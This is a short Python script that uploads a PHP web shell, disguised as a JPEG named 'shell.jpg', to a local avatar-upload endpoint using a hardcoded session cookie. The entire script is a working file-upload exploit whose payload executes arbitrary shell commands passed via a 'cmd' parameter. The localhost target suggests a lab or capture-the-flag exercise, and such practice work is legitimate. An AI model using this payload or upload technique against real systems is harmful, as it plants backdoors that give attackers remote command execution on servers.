import requests


url = 'http://localhost:3000/upload/avatar'


cookies={'connect.sid': 's%3AJtZf4all1C0l60M58112_pQMOK4UFL1D.Yq2LiDCLUwbfaLp0nL3s1MWXiEHWPs4fEJodoW9Ikmw'}


files = {
    'avatar': ('shell.jpg', b'<?php echo system($_GET["cmd"]); ?>', 'image/jpeg')
}


response = requests.post(url, files=files, cookies=cookies)
print(response.status_code)
print(response.text)
